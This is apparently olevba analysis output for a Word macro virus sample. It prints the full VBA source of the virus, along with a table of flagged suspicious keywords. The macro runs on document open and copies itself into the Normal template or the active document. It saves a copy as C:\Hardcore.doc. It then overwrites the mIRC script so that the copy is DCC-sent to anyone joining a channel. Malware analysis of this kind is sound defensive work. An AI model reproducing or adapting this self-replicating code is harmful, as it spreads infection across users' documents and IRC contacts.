olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.dp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.dp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
NormInstalled = False
ActInstalled = False
Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
If NormInstalled = False Then
    Set Infection = NormCarrier
    Set Carrier = ActCarrier
Else
    Set Infection = ActCarrier
    Set Carrier = NormCarrier
End If
With Carrier
    VirCode = .Lines(1, .CountOfLines)
End With
With Infection
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, VirCode
End With
MsgBox "IMPORTED-FROM-THE-FUTURE" & Chr(13) & "" & Chr(13) & "Contact: Jivemoph@hotmail.com", 0, "DeijaGen [CE] by Jivemoph"
ActiveDocument.SaveAs FileName:="C:\Hardcore.doc", fileformat:=wdFormatDocument, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Kill "C:\mIRC\Script.ini"
Open "C:\mIRC\Script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick C:\Hardcore.doc }"
Print #1, "n1=on 1:CONNECT: {"
Close 1
End Sub

'DeijaGen by Jivemoph
'Contact: Jivemoph@hotmail.com
'IMPORTED-FROM-THE-FUTURE
'
'Made for a contest.
'Made to win. [DeijaGen]
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

